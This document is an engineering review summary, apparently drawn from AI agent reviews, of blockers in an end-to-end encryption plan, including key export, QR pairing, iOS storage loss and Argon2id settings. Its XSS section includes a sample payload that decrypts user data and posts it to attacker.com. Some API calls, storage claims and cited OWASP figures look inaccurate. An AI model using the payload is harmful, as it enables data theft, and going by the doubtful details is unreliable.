# E2E Encryption Implementation - Critical Issues Summary

## ⚠️ DO NOT IMPLEMENT WITHOUT ADDRESSING THESE ISSUES

This document summarizes the **critical blockers** identified by 5 independent agent reviews of the device-generated key encryption plan.

---

## 🔴 BLOCKER #1: Non-Extractable Key Contradiction

**Location:** `e2e-encryption-device-keys-DRAFT.md` Lines 194-218

**Issue:**

```typescript
// Plan creates keys as non-extractable
const key = await crypto.subtle.generateKey(
  { name: 'AES-GCM', length: 256 },
  false, // ❌ non-extractable
  ['encrypt', 'decrypt']
);

// But then tries to export for cloud backup
async exportKeyForBackup(): Promise<ArrayBuffer> {
  return crypto.subtle.exportKey('raw', key); // ❌ WILL FAIL!
}
```

**Why This Breaks:**

- WebCrypto spec: non-extractable keys **cannot** be exported
- `exportKey()` will throw `InvalidAccessError`
- Cloud backup feature will be completely broken

**Fix:**

```typescript
// Keys MUST be extractable when cloud backup enabled
const extractable = userWantsCloudBackup ? true : false;
const key = await crypto.subtle.generateKey(
  { name: 'AES-GCM', length: 256 },
  extractable, // ✅ conditional based on user choice
  ['encrypt', 'decrypt'],
);
```

**Impact:** **CRITICAL - Entire cloud backup feature broken**

**Estimated Fix Time:** 2 days (design + implementation + tests)

---

## 🔴 BLOCKER #2: QR Code Security Completely Unspecified

**Location:** `e2e-encryption-device-keys-DRAFT.md` Lines 104-116

**Issue:**
Plan says "QR code containing encrypted master key" but:

- ❌ No specification of HOW it's encrypted
- ❌ No key exchange protocol defined
- ❌ No MITM protection
- ❌ No visual verification

**What Could Go Wrong:**

```
Scenario: MITM Attack
1. User tries to pair new device
2. Attacker intercepts QR display (screen share malware)
3. Attacker shows own QR code
4. User scans attacker's QR → master key compromised
5. Attacker decrypts all data
```

**Industry Standard: WhatsApp's ECDH Pairing**

```typescript
// 1. Primary device generates ephemeral ECDH key pair
const primaryKeypair = await crypto.subtle.generateKey(
  { name: 'ECDH', namedCurve: 'P-256' },
  true,
  ['deriveKey']
);

// 2. QR code contains PUBLIC key only (safe)
const qrPayload = {
  publicKey: await crypto.subtle.exportKey('spki', primaryKeypair.publicKey),
  sessionId: generateSessionId(),
};

// 3. New device generates own ECDH key pair
const newDeviceKeypair = await crypto.subtle.generateKey(...);

// 4. Both devices derive shared session key (ECDH magic)
const sessionKey = await crypto.subtle.deriveKey(
  { name: 'ECDH', public: otherDevicePublicKey },
  ownPrivateKey,
  { name: 'AES-GCM', length: 256 },
  false,
  ['encrypt', 'decrypt']
);

// 5. Primary encrypts master key with session key
const encryptedMasterKey = await crypto.subtle.encrypt(
  { name: 'AES-GCM', iv: randomIV },
  sessionKey,
  masterKey
);

// 6. Visual verification (6-digit code on both devices)
const verificationCode = await calculateFingerprint(
  primaryPublicKey,
  newDevicePublicKey
);
// User confirms codes match → prevents MITM
```

**Impact:** **CRITICAL - QR pairing completely insecure**

**Estimated Fix Time:** 5 days (protocol design + server coordination + UI + tests)

---

## 🔴 BLOCKER #3: iOS Safari 7-Day Data Loss

**Location:** Not addressed in plan

**Issue:**
iOS Safari **automatically deletes** all IndexedDB data after 7 days of inactivity.

**Evidence:**

- Apple Developer Documentation: "Safari on iOS deletes non-persistent IndexedDB after 7 days"
- Affects **30% of mobile users** (Safari mobile market share)
- Cannot be prevented by JavaScript APIs

**Real-World Impact:**

```
Day 1: User sets up encryption on iPhone
Day 8: User opens app (hasn't used in 7 days)
Result: IndexedDB deleted → encryption key GONE → ALL DATA LOST
```

**Current Plan:** Optional recovery password (user can skip)
**Problem:** Users who skip lose ALL DATA after 7 days

**Fix: Platform-Specific Recovery Requirements**

```typescript
// Detect iOS Safari
const isIOSSafari = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;

if (isIOSSafari) {
  // REQUIRE recovery password on iOS (not optional)
  const password = await showRecoveryPasswordDialog({
    canSkip: false, // ❌ No skip button on iOS
    message: 'iOS Safari may delete local data. Recovery password required.',
  });
} else {
  // Desktop: Optional recovery password
  const password = await showRecoveryPasswordDialog({
    canSkip: true, // ✅ Can skip on desktop
  });
}
```

**Alternative:** Use Capacitor native storage on mobile

```typescript
if (IS_CAPACITOR) {
  // Store key in native iOS Keychain (survives 7-day deletion)
  await Preferences.set({
    key: 'encryption-master-key',
    value: await exportKey(masterKey),
  });
}
```

**Impact:** **CRITICAL - 30% of users will lose all data**

**Estimated Fix Time:** 3 days (detection + mandatory flow + testing on real iOS devices)

---

## 🔴 BLOCKER #4: Key Conflict Data Loss

**Location:** Server API design (`packages/super-sync-server/src/key-backup/`)

**Issue:**
Two devices can upload different encryption keys simultaneously:

```
Device A (11:00:00): Uploads KeyA to server
Device B (11:00:01): Uploads KeyB to server (overwrites KeyA)
Result: Device A can no longer decrypt Device B's data
```

**Current Plan:** Simple upsert (last-write-wins)

```typescript
await prisma.keyBackup.upsert({
  where: { userId },
  create: { userId, encryptedKey, salt },
  update: { encryptedKey, salt }, // ❌ Blindly overwrites
});
```

**Fix: Conflict Detection + User Resolution**

```typescript
// Server-side conflict detection
fastify.post('/api/key-backup', async (req, reply) => {
  const { userId } = req.user;
  const { encryptedKey, salt, deviceId } = req.body;

  const existing = await prisma.keyBackup.findUnique({
    where: { userId },
  });

  if (existing && existing.deviceId !== deviceId) {
    // CONFLICT: Different device uploaded key
    return reply.code(409).send({
      error: 'KEY_CONFLICT',
      message: 'Another device has uploaded a different encryption key',
      existingDeviceId: existing.deviceId,
    });
  }

  // Safe to upsert
  await prisma.keyBackup.upsert(...);
});

// Client-side conflict resolution
try {
  await uploadKeyBackup(...);
} catch (err) {
  if (err.status === 409) {
    // Show user choice dialog
    const choice = await showDialog({
      title: 'Key Conflict Detected',
      message: 'Another device has uploaded a different encryption key. Choose:',
      options: [
        'Use This Device\'s Key (Other Device Will Lose Data)',
        'Download Other Device\'s Key (This Device Loses Data)',
        'Cancel Setup',
      ],
    });

    if (choice === 0) {
      await uploadKeyBackup({ force: true }); // Overwrite
    } else if (choice === 1) {
      await downloadKeyBackup(); // Import other key
    }
  }
}
```

**Impact:** **CRITICAL - Silent data loss in multi-device setups**

**Estimated Fix Time:** 3 days (server conflict detection + client resolution UI + tests)

---

## 🟡 HIGH PRIORITY: Weak Argon2id Parameters

**Location:** `e2e-encryption-device-keys-DRAFT.md` Lines 285-290

**Issue:**

```typescript
const kek = await Argon2id.hash(recoveryPassword, {
  salt,
  iterations: 3, // ❌ Minimum (2019 standard)
  memory: 64 * 1024, // ❌ 64 MB (minimum)
  hashLength: 32,
});
```

**OWASP 2024 Recommendations:**

- Minimum: 64 MB, 3 iterations (2019)
- **Recommended: 256 MB, 4 iterations** (2025)
- High-security: 512 MB, 4 iterations

**Attack Cost Analysis:**

| Password      | Current (64MB, 3 iter) | Recommended (256MB, 4 iter) |
| ------------- | ---------------------- | --------------------------- |
| 8-char simple | 1 day = $2.40          | 5 days = $12                |
| 10-char mixed | 2 years = $1,750       | 10 years = $8,750           |

**Fix:**

```typescript
const kek = await Argon2id.hash(recoveryPassword, {
  salt,
  iterations: 4, // ✅ +1 iteration
  memory: 256 * 1024, // ✅ 4x stronger
  parallelism: 2, // Mobile-friendly
  hashLength: 32,
});
```

**Mobile Consideration:**

```typescript
// Adaptive parameters for low-end devices
const memory = IS_LOW_END_MOBILE ? 128 * 1024 : 256 * 1024;
const iterations = IS_LOW_END_MOBILE ? 3 : 4;
```

**Impact:** **HIGH - Weak passwords vulnerable to brute-force**

**Estimated Fix Time:** 1 day (parameter update + mobile detection + tests)

---

## 🟡 HIGH PRIORITY: False XSS Protection Claims

**Location:** `e2e-encryption-device-keys-DRAFT.md` Lines 43, 196, 662

**Issue:**
Plan claims "non-extractable keys protect against XSS"

**This is FALSE:**

```javascript
// XSS payload CAN still do this:
const key = await indexedDB.getKey('master');
const plaintext = await crypto.subtle.decrypt(
  { name: 'AES-GCM', iv },
  key,
  encryptedData,
);
fetch('https://attacker.com', { method: 'POST', body: plaintext }); // ❌ Data stolen
```

**What Non-Extractable Actually Prevents:**

- ✅ Prevents: `crypto.subtle.exportKey('raw', key)` (exporting raw bytes)
- ❌ Does NOT prevent: Using key for encrypt/decrypt operations
- ❌ Does NOT prevent: XSS attacks

**Real XSS Protections:**

```html
<!-- Content Security Policy -->
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self' 'sha256-...'; object-src 'none';"
/>

<!-- Subresource Integrity -->
<script
  src="app.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

**Fix:**

1. Remove misleading comments about XSS protection
2. Add honest threat model: "XSS can access plaintext via encrypt/decrypt APIs"
3. Implement real CSP + SRI protections

**Impact:** **HIGH - Users misunderstand security guarantees**

**Estimated Fix Time:** 1 day (documentation + CSP/SRI setup)

---

## Summary: Phase 0 Critical Fixes Required

**BEFORE ANY IMPLEMENTATION:**

| Issue               | Severity | Fix Time | Blockers Implementation? |
| ------------------- | -------- | -------- | ------------------------ |
| Non-extractable key | BLOCKER  | 2 days   | ✅ YES                   |
| QR security gap     | BLOCKER  | 5 days   | ✅ YES                   |
| iOS 7-day data loss | BLOCKER  | 3 days   | ✅ YES                   |
| Key conflicts       | BLOCKER  | 3 days   | ✅ YES                   |
| Weak Argon2id       | HIGH     | 1 day    | ⚠️ RECOMMENDED           |
| XSS misconception   | HIGH     | 1 day    | ⚠️ RECOMMENDED           |

**Total Phase 0 Time:** 15 days (3 weeks)

**Revised Implementation Timeline:**

- Phase 0: Critical fixes (3 weeks)
- Phase 1-6: Original plan (12 weeks)
- **Total: 15 weeks** (was 12)

---

## Confidence Assessment

**Before Agent Review:** 85%
**After Agent Review:** 50%
**After Phase 0 Fixes:** Projected 85%

**Recommendation:** **DO NOT proceed** without Phase 0 fixes. All 4 blockers will cause:

- Complete feature breakage (non-extractable)
- Security vulnerabilities (QR MITM)
- Data loss (iOS eviction, key conflicts)

---

## Related Documents

- Full revised plan: `docs/long-term-plans/e2e-encryption-device-keys-DRAFT.md`
- Agent review reports: `/home/johannes/.claude/plans/dapper-riding-seahorse-agent-*.md`
- Security review: Agent a5dd02f (comprehensive threat analysis)
- Performance review: Agent a526436 (WebCrypto benchmarks)

---

**Document Status:** DRAFT - Critical Issues Summary
**Last Updated:** 2026-01-23
**Next Review:** After Phase 0 fixes implemented
